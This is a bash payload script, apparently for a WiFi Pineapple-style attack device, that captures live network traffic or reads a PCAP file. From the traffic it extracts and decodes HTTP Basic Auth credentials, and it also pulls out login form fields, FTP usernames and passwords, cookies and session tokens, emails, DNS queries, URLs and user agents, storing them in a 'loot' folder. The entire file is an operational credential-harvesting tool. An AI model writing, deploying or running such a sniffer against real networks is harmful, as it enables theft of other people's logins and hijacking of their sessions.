#!/bin/bash
# Title: Packet Carver
# Author: bad-antics
# Description: Extract files, credentials, and artifacts from PCAP captures
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/carved"
mkdir -p "$LOOT_DIR"

PROMPT "PACKET CARVER

Extract data from captured
network traffic.

Extracts:
- HTTP credentials (basic auth)
- HTTP file downloads
- DNS query history
- FTP credentials
- SMTP/email addresses
- Cookie/session tokens

Press OK to configure."

# Check for required tools
for tool in tcpdump grep awk sed; do
    command -v $tool >/dev/null || { ERROR_DIALOG "$tool not found!"; exit 1; }
done

MODE=$(CONFIRMATION_DIALOG "CAPTURE MODE

OK = Live capture now
CANCEL = Analyze existing PCAP")

TIMESTAMP=$(date +%Y%m%d_%H%M)
CARVE_DIR="$LOOT_DIR/carve_${TIMESTAMP}"
mkdir -p "$CARVE_DIR"

if [ "$MODE" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    # Live capture mode
    IFACE=$(TEXT_PICKER "Interface:" "br-lan")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) IFACE="br-lan" ;; esac

    DURATION=$(NUMBER_PICKER "Capture duration (min):" 5)
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=5 ;; esac

    resp=$(CONFIRMATION_DIALOG "START LIVE CAPTURE?

Interface: $IFACE
Duration: ${DURATION} min

Traffic will be captured
and analyzed for artifacts.

Press OK to begin.")
    [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

    PCAP_FILE="/tmp/carver_${TIMESTAMP}.pcap"
    SPINNER_START "Capturing traffic..."
    timeout $((DURATION * 60)) tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 2>/dev/null
    SPINNER_STOP
else
    # Existing PCAP mode
    PCAP_FILE=$(TEXT_PICKER "PCAP path:" "/mmc/nullsec/capture.pcap")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

    [ ! -f "$PCAP_FILE" ] && { ERROR_DIALOG "File not found:\n$PCAP_FILE"; exit 1; }
fi

SPINNER_START "Carving artifacts..."

REPORT="$CARVE_DIR/carve_report.txt"
echo "================================================================" > "$REPORT"
echo "         NULLSEC PACKET CARVER REPORT                          " >> "$REPORT"
echo "================================================================" >> "$REPORT"
echo "Source: $PCAP_FILE" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "" >> "$REPORT"

HTTP_CREDS=0
DNS_QUERIES=0
FTP_CREDS=0
COOKIES=0
EMAILS=0

# --- Extract HTTP Basic Auth credentials ---
echo "--- HTTP CREDENTIALS ---" >> "$REPORT"
tcpdump -r "$PCAP_FILE" -A 2>/dev/null | grep -i "Authorization: Basic" | while read -r line; do
    encoded=$(echo "$line" | awk '{print $NF}')
    decoded=$(echo "$encoded" | base64 -d 2>/dev/null)
    [ -n "$decoded" ] && echo "  $decoded" >> "$REPORT" && HTTP_CREDS=$((HTTP_CREDS+1))
done

# Extract HTTP POST data (form submissions)
tcpdump -r "$PCAP_FILE" -A 2>/dev/null | grep -iE "(username|password|user|pass|login|email)=" | head -50 > "$CARVE_DIR/http_post_data.txt"
POST_COUNT=$(wc -l < "$CARVE_DIR/http_post_data.txt")
[ "$POST_COUNT" -gt 0 ] && echo "  HTTP POST data: $POST_COUNT entries -> http_post_data.txt" >> "$REPORT"
echo "" >> "$REPORT"

# --- Extract DNS queries ---
echo "--- DNS QUERIES ---" >> "$REPORT"
tcpdump -r "$PCAP_FILE" -n port 53 2>/dev/null | grep -oE "[A-Za-z0-9.-]+\.[a-z]{2,}" | sort -u > "$CARVE_DIR/dns_queries.txt"
DNS_QUERIES=$(wc -l < "$CARVE_DIR/dns_queries.txt")
echo "  Unique domains: $DNS_QUERIES -> dns_queries.txt" >> "$REPORT"
# Top 10 domains
head -10 "$CARVE_DIR/dns_queries.txt" | while read -r domain; do
    echo "    $domain" >> "$REPORT"
done
echo "" >> "$REPORT"

# --- Extract FTP credentials ---
echo "--- FTP CREDENTIALS ---" >> "$REPORT"
tcpdump -r "$PCAP_FILE" -A port 21 2>/dev/null | grep -iE "^(USER|PASS)" | while read -r line; do
    echo "  $line" >> "$REPORT"
    FTP_CREDS=$((FTP_CREDS+1))
done
echo "" >> "$REPORT"

# --- Extract cookies and session tokens ---
echo "--- COOKIES / SESSIONS ---" >> "$REPORT"
tcpdump -r "$PCAP_FILE" -A 2>/dev/null | grep -i "Cookie:" | head -30 > "$CARVE_DIR/cookies.txt"
COOKIES=$(wc -l < "$CARVE_DIR/cookies.txt")
echo "  Cookies captured: $COOKIES -> cookies.txt" >> "$REPORT"
echo "" >> "$REPORT"

# --- Extract email addresses ---
echo "--- EMAIL ADDRESSES ---" >> "$REPORT"
tcpdump -r "$PCAP_FILE" -A 2>/dev/null | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u > "$CARVE_DIR/emails.txt"
EMAILS=$(wc -l < "$CARVE_DIR/emails.txt")
echo "  Unique emails: $EMAILS -> emails.txt" >> "$REPORT"
head -10 "$CARVE_DIR/emails.txt" | while read -r email; do
    echo "    $email" >> "$REPORT"
done
echo "" >> "$REPORT"

# --- Extract HTTP URLs ---
echo "--- HTTP URLS ---" >> "$REPORT"
tcpdump -r "$PCAP_FILE" -A 2>/dev/null | grep -oE "(GET|POST) [^ ]+ HTTP" | awk '{print $2}' | sort -u > "$CARVE_DIR/urls.txt"
URL_COUNT=$(wc -l < "$CARVE_DIR/urls.txt")
echo "  Unique URLs: $URL_COUNT -> urls.txt" >> "$REPORT"
echo "" >> "$REPORT"

# --- Extract User-Agents (device fingerprinting) ---
echo "--- USER AGENTS ---" >> "$REPORT"
tcpdump -r "$PCAP_FILE" -A 2>/dev/null | grep -i "User-Agent:" | sort -u | head -20 > "$CARVE_DIR/user_agents.txt"
UA_COUNT=$(wc -l < "$CARVE_DIR/user_agents.txt")
echo "  Unique agents: $UA_COUNT -> user_agents.txt" >> "$REPORT"
echo "" >> "$REPORT"

echo "================================================================" >> "$REPORT"
echo "All artifacts: $CARVE_DIR/" >> "$REPORT"

SPINNER_STOP

PROMPT "CARVING COMPLETE

DNS Queries: $DNS_QUERIES
HTTP URLs: $URL_COUNT
Cookies: $COOKIES
Emails: $EMAILS
User Agents: $UA_COUNT

All artifacts saved to:
$CARVE_DIR/

Report: carve_report.txt"
